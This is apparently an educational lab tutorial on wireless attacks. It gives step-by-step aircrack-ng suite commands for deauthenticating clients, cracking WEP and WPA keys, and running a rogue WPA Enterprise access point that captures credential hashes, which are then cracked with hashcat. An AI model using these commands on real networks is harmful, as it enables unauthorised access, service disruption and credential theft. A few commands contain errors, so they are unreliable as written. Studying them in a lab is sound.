# A Review of Wireless Attack Techniques

As the number of wireless networks and devices we use increases, we must ensure we have a solid understanding of the threats they present and how to address them.  This document will review basic wireless attack techniques that could be used on enterprise wireless networks as well as personal wireless networks.

As knowledge of these attack techniques grows, so does knowledge on how to defend, respond to, and investigate them.  Test and become familiar with common wireless attack tools and techniques using the following:


- [Overview and Concepts](#overview-and-concepts)
	- [Beacons](#beacons)
	- [Probes](#probes)
	- [Authentication](#authentication)
	- [Association](#association)
	- [WPA Encryption](#wpa-encryption)
- [Kali Linux Wireless Tools](#kali-linux-wireless-tools)
	- [Monitoring with airmon-ng](#monitoring-with-airmon-ng)
	- [Sniffing with airodump-ng](#sniffing-with-airodump-ng)
	- [Injecting with aireplay-ng](#injecting-with-aireplay-ng)
	- [Key Attacks with aircrack-ng](#key-attacks-with-aircrack-ng)
- [Wireless Attack Techniques](#wireless-attack-techniques)
	- [Attacking Open WEP](#attacking-open-wep)
	- [Attacking Shared Key WEP](#attacking-shared-key-wep)
	- [Attacking WPA and WPA2](#attacking-wpa-and-wpa2)
	- [Attacking WPA Enterprise](#attacking-wpe-enterprise)
- [List of Common Commands](#list-of-common-commands)


## Overview and Concepts

802.11 is a set of standards created by IEEE to define protocols to be used on wireless networks.  Here are the most well-known:

|Protocol|Frequency|Rates|
|-|-|-|
|802.11|2.4 GHz|Up to 2 Mbit/s|
|802.11a|5 GHz|Up to 54 Mbit/s|
|802.11b|2.4 GHz|Up to 11 Mbit/s| 
|802.11g|2.4 GHz|Up to 54 Mbit/s|
|802.11n|2.4 & 5 GHz|Up to 600 Mbit/s|

<br>

A wireless network can be set up in two modes:

|Mode|Description|
|-|-|
|Infrastructure|An access point (AP) advertises a SSID and relays packets to other nodes in the group called a Basic Service Set (BSS)|
|Ad-Hoc|A station (STA) advertises a SSID so other nodes can access it, called an Independent Basic Service Set (IBSS)|

<br>

A majority of the time we are dealing with wireless networks in Infrastructure Mode with an AP which is connected to the wired network and multiple clients that connect to the AP's SSID to access the wired network.

When a client connects to a wireless network, the following steps occur:

|Step|Description|
|-|-|
|[Beacons](#beacons)|The AP sends beacons containing network information such as SSID, data rates, etc|
|[Probes](#probes)|Clients send probes looking for networks, APs respond with channel and supported rates|
|[Authentication](#authentication)|Client authenticates using Open, WEP, TKIP (WPA1), or CCMP (WPA2)|
|[Association](#association)|After authenticating, a client associates with and joins the network|
|[WPA Encryption](#wpa-encryption)|If WPA is used, client performs key exchange and verification|

### Beacons

A beacon is sent from an AP with MAC Address `e6:f4:c6:14:ad:a8` advertising a SSID with the name of `dlink000`:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image043.png)<br><br>


### Probes

Clients send out probes to the broadcast address to find APs:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image044.png)<br><br>

The AP hosting the `dlink000` network responds to this probe along with several other APs that received the probe:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image045.png)<br><br>


### Authentication

The client authenticates to the AP with an Authentication packet:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image046.png)<br><br>

The AP responds reporting the client successfully authenticated to the Open network:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image047.png)<br><br>


### Association

After authenticating, the client sends an association request to the AP:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image048.png)<br><br>

A successful response from the AP allows the client to join the network:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image049.png)<br><br>

### WPA Encryption

For networks protected by WPA/WPA2, after agreeing on the security protocol to be used, the station authenticates to the AP with a pre-shared key or via 802.1X with WPA Enterprise.

If authentication is successful, the client is provided access to the network and can then request an IP address via DHCP and route traffic through the AP.

## Kali Linux Wireless Tools

To observe and interact with endpoints performing these wireless connection steps, we need a wireless attack platform.  The most common is Kali Linux which you can download and create a VM for testing.

You'll also need to set up a test network using a wireless router or access point.  Best option is one that is capable of hosting open, WEP, and WPA/WPA2 networks such as [this one](https://support.dlink.com/ProductInfo.aspx?m=DIR-601).

When you have Kali running, find your wireless interface with `iwconfig`.  If you choose to map a USB wireless device to the VM, make sure you are a member of the `vboxusers` and `disk` groups with:

```
sudo usermod -a -G vboxusers <username>
sudo usermod -a -G disk <username>
```

Then select the device in `Settings` --> `USB`:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image001.png)<br><br>

Or connect it using the menu with `Devices` --> `USB` --> `Your Device`.  Now you should be able to see the interface:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image002.png)<br><br>

Here is a quick introduction to some of Kali's most effective wireless tools:

- [Monitoring with airmon-ng](#monitoring-with-airmon-ng)
- [Sniffing with airodump-ng](#sniffing-with-airodump-ng)
- [Injecting with aireplay-ng](#injecting-with-aireplay-ng)
- [Key Attacks with aircrack-ng](#key-attacks-with-aircrack-ng)


### Monitoring with airmon-ng

Use `airmon-ng` to confirm your wireless interface is available:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image003.png)<br><br>

Use the `check` argument to list conflicting processes and `check kill` to terminate these processes:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image004.png)<br><br>

Kali's wireless interface is `wlan0` and starts off in managed mode.  We need to create an interface in monitor mode to observe all traffic on all channels.

Do this with `airmon-ng start wlan0` and confirm with `iwconfig` that you now have a new wireless interface (mine is named `wlan0mon`) which is in monitor mode:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image005.png)<br><br>

### Sniffing with airodump-ng 

You can now use this interface in monitor mode to capture traffic on all channels using `airodump-ng wlan0mon`:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image006.png)<br><br>

Let's say we're going to target the `dlink000` network---all the other wireless networks on different channels create a lot of noise can be filtered out.  Capture only the traffic from the channel the targeted network is using by using `airodump-ng wlan0mon -c 6` :

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image007.png)<br><br>

Down at the bottom we can see the clients that are connected to the AP (`E6:F4:C6:14:AD:AB`):

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image009.png)<br><br>

Set up a test network using open authentication, join with a client, and attempt to logon to an HTTP website while capturing traffic to a file with `airodump-ng wlan0mon -c 8 --bssid E6:F4:C6:14:AD:A8 -w open`.  Inspect the file with Wireshark and locate the credentials used:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image008.png)<br><br>


### Injecting with aireplay-ng

Once packets can be captured, the next step is injecting packets on the network to support a number of different attacks.  Before this can happen, the attacking machine must authenticate in order to be able to send packets to an access point.

We can demonstrate this creating a test network secured with WEP such as this one named `dlink123`:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image010.png)<br><br>

Begin dumping traffic with `airodump-ng wlan0mon -c 6 --bssid 14:D6:4D:26:81:04 -w wep`. Then perform a fake authentication attack with `aireplay-ng` by replaying captured packets with `aireplay-ng --fakeauth 0 -e dlink123 wlan0mon` to join the Kali VM to the network:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image012.png)<br><br>

Open the `wep.cap` capture file in Wireshark to see the fake authentication and association (Auth request/response and Assoc request/response):

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image013.png)<br><br>

Injecting packets can be used to deauthenticate clients or generate specific types of packets on the network such as ARP replies.

#### Deauthenticating Clients

Deauthenticating a wireless client is used for recovering hidden SSIDs, capturing WPA/WPA2 handshakes, and to cause clients to generate ARP packets on the network.  

Deauthenticate a client on a wireless network with `aireplay-ng --deauth 1 -a 14:D6:4D:26:81:04 -c 5C:1D:D9:F3:3A:D7 wlan0mon`:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image014.png)<br><br>

Monitor the client `5C:1D:D9:F3:3A:D7` and confirm it is knocked off the network and is forced to take the necessary steps to rejoin.

#### Generating Packets

A common technique used to crack a WEP key is to generate traffic on the network by replaying a captured ARP request over and over.  All of the replies to these requests contain unique IVs which, when enough are collected, can be used to crack the WEP key.

A patient attacker may wait for arp request to occur on its own or force one by deauthenticating a client.  Either method will eventually require the attacker to be able to inject packets into the network.

Test networks for injection with `aireplay-ng --test wlan0mon` which will list all APs that respond to broadcast probes:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image018.png)<br><br>

No perform a fake authentication with `--fakeauth` and then begin transmitting ARP packets with `aireplay-ng --arpreplay -b 14:D6:4D:26:81:04 -h 00:C0:CA:97:2B:52 wlan0mon`:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image015.png)<br><br>


Capture all of the responses using `airodump-ng wlan0mon -c 6 --bssid 14:D6:4D:26:81:04 -w replay`:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image016.png)<br><br>


### Key Attacks with aircrack-ng

Once enough packets with unique IVs have been captured, you can use `aircrack-ng` to identify the encryption key used on the network with `aircrack-ng replay-01.cap`.  It will run until it decrypts the WEP key:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image017.png)<br><br>


`aircrack-ng` uses several different methods to crack keys:

|Method|Description|
|-|-|
|PTW Cracking|Only used with ARP request replay method and can only crack 40 and 104-bit WEP keys|
|FMS/KoreK Cracking|Uses statistical analysis and then bruteforces with the most likely keys|
|Dictionary Attacks|Uses a file with either ASCII keys or hexadecimal keys|

<br>

## Wireless Attack Techniques

This section will review the following wireless attack techniques:

- [Attacking Open WEP](#attacking-open-wep)
	- [WEP Client](#wep-client)
	- [WEP Clientless](#wepclientless)
- [Attacking Shared Key WEP](#shared-key-wep)
- [Attacking WPA and WPA2](#attacking-wpa-and-wpa2)
	- [Guessing Passwords](#guessing-passwords)
	- [Decrypting Packets](#decrypting-packets)	
- [Attacking WPA Enterprise](#attacking-wpe-enterprise)
- [Evil Twin Access Point](#evil-twin-access-point)
- [Man in the Middle Attack](#man-in-the-middle-attack)

<br>

Once you've identified interesting access points and clients, it's easiest to save their MAC addresses as environment variables:

```
export AP=14:D6:4D:26:81:04
export VIC=5C:1D:D9:F3:3A:D7
export MON=00:C0:CA:97:2B:52
export BC=FF:FF:FF:FF:FF:FF
```

### Attacking Open WEP

Open WEP can be cracked if enough packets with unique IVs are captured.  The primary way to do this is to capture an ARP request and replay it over and over causing the access point to generate lots of ARP replies, each containing a unique IV.

#### WEP Client

If the access point has protections or is out of range of attacker, it is possible to replay an ARP request to the client so it will respond with ARP replies, each containing a unique IV.

Use the following steps to replay an ARP request to the victim client and crack the WEP key:

|Step|Command|
|-|-|
|Capture traffic|`airodump-ng -c 6 --bssid $AP -w cwep wlan0mon`|
|Perform fake authentication|`aireplay-ng --fakeauth 0 -e dlink123 -b $AP -h $MON wlan0mon`|
|Deauth clients to generate IVs|`aireplay-ng --deauth 1 -a $AP -c $VIC wlan0mon`|
|Replay captured ARP requests|`aireplay-ng --arpreplay -b $AP -h $MON wlan0mon`|
|Crack WEP key|`aircrack-ng cwep-01.cap`|

<br>

Here `airodump-ng` is collecting all traffic on the channel into file `cwep-01.cap`:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image019.png)<br><br>

Once an ARP request to the client is captured, it is replayed many times to generate a sufficient number of IVs:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image020.png)<br><br>

Then aircrack-ng is pointed at the captured traffic and cracks they key:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image021.png)<br><br>


#### WEP Clientless

Attack a WEP network with no clients connected by obtaining a PRGA file from the AP and using it to build an encrypted packet that can be replayed on the network to generate IVs.  Two common techniques are using the Fragmentation Attack and ChopChop Attack.

Use the following steps to do this using the Fragmentation Attack:

|Step|Command|
|-|-|
|Capture traffic|`airodump-ng -c 6 --bssid $AP -w fwep wlan0mon`|
|Associate to network every 60 sec|`aireplay-ng --fakeauth 0 -e dlink123 -b $AP -h $MON wlan0mon`|
|Use fragment attack to get a keystream|`aireplay-ng --fragment -b $AP -h $MON wlan0mon`|
|Build an ARP request|`packetforge-ng -0 -a $AP -h MON -l 255.255.255.255 -k 255.255.255.255 -y fragment-1231-151520.xor -w inject.cap`|
|Replay the ARP request|`aireplay-ng --interactive -r inject.cap wlan0mon`|
|Crack WEP key|`aircrack-ng fwep-01.cap`|

<br>

Once traffic is being captured, configure `aireplay-ng` to associate to the network every 60 seconds:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image022.png)<br><br>

Use the fragment attack to get a keystream:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image023.png)<br><br>

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image024.png)<br><br>

`packetforge-ng` uses the PRGA file (`.xor`) to create an encrypted packet:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image025.png)<br><br>

Inject the encrypted ARP request into the network to cause AP to generate packets with new IVs:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image026.png)<br><br>

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image027.png)<br><br>

Use `aircrack-ng` to crack the WEP key:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image028.png)<br><br>


### Attacking Shared Key WEP

When Shared Key WEP is being used, the attacker must capture traffic resulting from a client joining the network which contains a PRGA file (`.xor`).  This PRGA file is used to create encrypted packets that can be injected into the network.

Use the following steps:

|Step|Command|
|-|-|
|Capture traffic|`airodump-ng -c 6 --bssid $AP -w wep-shared wlan0mon`|
|Deauth client to get a PRGA| `aireplay-ng --deauth 1 -a $AP -c $VIC wlan0mon`|
|Use PRGA to associate every 60 sec|`aireplay-ng -1 60 -e dlink123 -y <PRGA file> -a $AP - h $MON wlan0mon`|
|Replay captured ARP requests|`aireplay-ng --arpreplay -b $AP -h $MON wlan0mon`|
|Crack WEP key|`aircrack-ng wep-shared-01.cap`|

<br>

We use the PRGA to associate to the network every 60 seconds so we can send packets:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image029.png)<br><br>

Replaying the packet over and over makes the AP reply with a new IV:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image030.png)<br><br>

This allows us to capture thousands and thousands of new IVs:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image031.png)<br><br>

When enough IVs are captured, the shared key can be cracked:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image032.png)<br><br>


### Attacking WPA and WPA2

For attacks against WPA/WPA2 networks, the encryption is too strong to use statistics and requires using a dictionary attack to identify the key once a 4 way handshake is captured.

Use the following steps to try this:

|Step|Command|
|-|-|
|Capture traffic|`airodump-ng -c 6 --bssid $AP -w wpa wlan0mon`|
|Deauth client to force handshake| `aireplay-ng --deauth 1 -a $AP -c $VIC wlan0mon`|
|Perform dictionary attack|`aircrack-ng -w wpa-01.cap`|

<br>

Begin capturing traffic:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image033.png)<br><br>

Deauthenticating the client forces it to perform the handshake again:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image034.png)<br><br>

Make sure the WPA Shared Key is in your password list:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image035.png)<br><br>

And `aircrack-ng` can identify the key:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image036.png)<br><br>


### Attacking WPA Enterprise

A simple way to simulate an attack on a network protected with WPA Enterprise is to use the `hostapd-wpe` program. 

Install it with:

```
apt-get install hostapd-wpe
```

Open configuration file `/etc/hostapd-wpe/hostapd-wpe.conf` and edit the interface, SSID, and channel and add the path to a certificate you would like to use:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image037.png)<br><br>

Run the application and log on with the client:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image038.png)<br><br>

The client will be prompted to trust the certificate used:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image040.png)<br><br>

Enter credentials on the client and watch as the hashes are provided to the attacker:

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image041.png)<br><br>

Several different tools can be used to perform a dictionary attack on the captured hashes.  To identify the password with hashcat, put the hashcat NETNTLM hash in a file named `hash.txt`, pick a wordlist that contains the password you used, then use the command:

```
hashcat -m 5500 -a 0 hash.txt <password-file> --force`
```

![](images/A%20Review%20of%20Wireless%20Attack%20Techniques/image042.png)<br><br>


## Summary

WEP keys, no matter how complex, will be cracked when enough data packets encrypted with the key are captured and fed to `aircrack-ng`.  Common attacks against WEP-encrypted networks involve passively or actively collecting large amounts of ARP replies containing unique IVs.

WPA and WPA2-protected networks do not have WEP's cryptological vulnerabilities, but their keys can be discovered with a dictionary attack if the four-way handshake between client and access point is captured and fed to a password attack tool with a wordlist.

When keys are obtained, traffic on the network can be captured and decrypted.  This allows monitoring all traffic on the network as well as follow-on attacks such as:

- Netbios and LLMNR Name Poisoning
- Relay attacks
- Kerberoasting
- Man in the Middle
- Exploiting vulnerabilities such as ETERNALBLUE 

<br>

Here is a list of the commands we used:

|Step|Command|
|-|-|
|Identify interface|`airmon-ng`|
|Kill conflicting processes|`airmon-ng check kill`|
|Start monitoring on channel|`airmon-ng start wlan0 -c <channel-number>`|
|Capture traffic on network|`airodump-ng -c <channel-number> --bssid <AP-MAC> -w <Filename> wlan0mon`|
|Deauthenticate client|`aireplay-ng --deauth 1 -a <AP-MAC> -c <Victim-MAC> wlan0mon`|
|Fake authentication|`aireplay-ng --fakeauth 0 -e <ESSID> wlan0mon`|
|Associate to network every 60 sec|`aireplay-ng --fakeauth 0 -e <ESSID> -b <AP-MAC> -h <Own-MAC> wlan0mon`|
|Associate every 60 sec using PRGA|`aireplay-ng -1 60 -e <ESSID> -y <PRGA file> -a <AP-MAC> -h <Own-MAC> wlan0mon`|
|Get keystream with fragment attack|`aireplay-ng --fragment -b <AP-MAC> -h <Own-MAC> wlan0mon`|
|Inject captured packets|`aireplay-ng --interactive -b <AP-MAC> -d <Broadcast-MAC> -f 1 -m 68 -n 86 wlan0mon`|
|Build a packet|`packetforge-ng -0 -a <AP-MAC> -h <Own-MAC> -l 192.168.0.111 -k 192.168.0.255 -y fragment-1231-151520.xor -w inject.cap`|
|Inject built packets|`aireplay-ng --interactive -r inject.cap wlan0mon`|
|Crack WEP key|`aircrack-ng <capture-file>`|
